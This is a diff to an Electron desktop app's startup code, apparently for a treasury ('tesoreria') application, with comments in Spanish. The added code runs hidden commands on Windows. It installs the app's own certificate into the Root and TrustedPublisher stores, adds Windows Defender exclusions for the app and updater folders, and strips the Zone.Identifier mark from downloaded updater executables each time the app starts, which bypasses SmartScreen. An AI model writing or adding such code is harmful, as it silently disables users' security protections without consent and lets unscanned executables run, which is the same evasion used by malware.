@@ -23,26 +23,40 @@ if (!gotTheLock) {
   });
 }
 
-// ─── Cert auto-install (para que el auto-updater no falle) ───
+// ─── Cert + Defender + SmartScreen auto-config ───
 function ensureCertInstalled() {
+  const { execSync } = require('child_process');
+  const markerPath = path.join(app.getPath('userData'), '.cert-installed');
+
+  // 1) Certificado de confianza (una sola vez)
   try {
     const cerPath = path.join(process.resourcesPath, 'certs', 'code-signing.cer');
-    if (!fs.existsSync(cerPath)) return;
+    if (fs.existsSync(cerPath) && !fs.existsSync(markerPath)) {
+      execSync(`certutil -addstore "TrustedPublisher" "${cerPath}"`, { windowsHide: true, stdio: 'ignore' });
+      execSync(`certutil -addstore "Root" "${cerPath}"`, { windowsHide: true, stdio: 'ignore' });
+      fs.writeFileSync(markerPath, new Date().toISOString());
+    }
+  } catch (e) { /* sin permisos admin - el NSIS installer ya lo hizo */ }
 
-    // Marcador: si ya se instalo, no repetir
-    const markerPath = path.join(app.getPath('userData'), '.cert-installed');
-    if (fs.existsSync(markerPath)) return;
+  // 2) Exclusion Windows Defender (una sola vez)
+  try {
+    const defenderMarker = path.join(app.getPath('userData'), '.defender-excluded');
+    if (!fs.existsSync(defenderMarker)) {
+      const appDir = path.dirname(app.getPath('exe'));
+      const updaterDir = path.join(app.getPath('home'), 'AppData', 'Local', 'tesoreria-updater');
+      execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${appDir}' -ErrorAction SilentlyContinue"`, { windowsHide: true, stdio: 'ignore' });
+      execSync(`powershell -Command "Add-MpPreference -ExclusionPath '${updaterDir}' -ErrorAction SilentlyContinue"`, { windowsHide: true, stdio: 'ignore' });
+      fs.writeFileSync(defenderMarker, new Date().toISOString());
+    }
+  } catch (e) { /* sin permisos - no critico */ }
 
-    // certutil -addstore instala silenciosamente (requiere admin en perMachine)
-    const { execSync } = require('child_process');
-    execSync(`certutil -addstore "TrustedPublisher" "${cerPath}"`, { windowsHide: true, stdio: 'ignore' });
-    execSync(`certutil -addstore "Root" "${cerPath}"`, { windowsHide: true, stdio: 'ignore' });
-
-    // Marcar como instalado
-    fs.writeFileSync(markerPath, new Date().toISOString());
-  } catch (e) {
-    // Si falla (sin permisos admin), no es critico - el NSIS installer ya lo hizo
-  }
+  // 3) Limpiar Zone.Identifier del updater pending (cada arranque)
+  try {
+    const pendingDir = path.join(app.getPath('home'), 'AppData', 'Local', 'tesoreria-updater', 'pending');
+    if (fs.existsSync(pendingDir)) {
+      execSync(`powershell -Command "Get-ChildItem '${pendingDir}\\*.exe' | ForEach-Object { Remove-Item -Path $_.FullName -Stream Zone.Identifier -ErrorAction SilentlyContinue }"`, { windowsHide: true, stdio: 'ignore' });
+    }
+  } catch (e) { /* no critico */ }
 }
 
 // ─── Auto-updater config ───
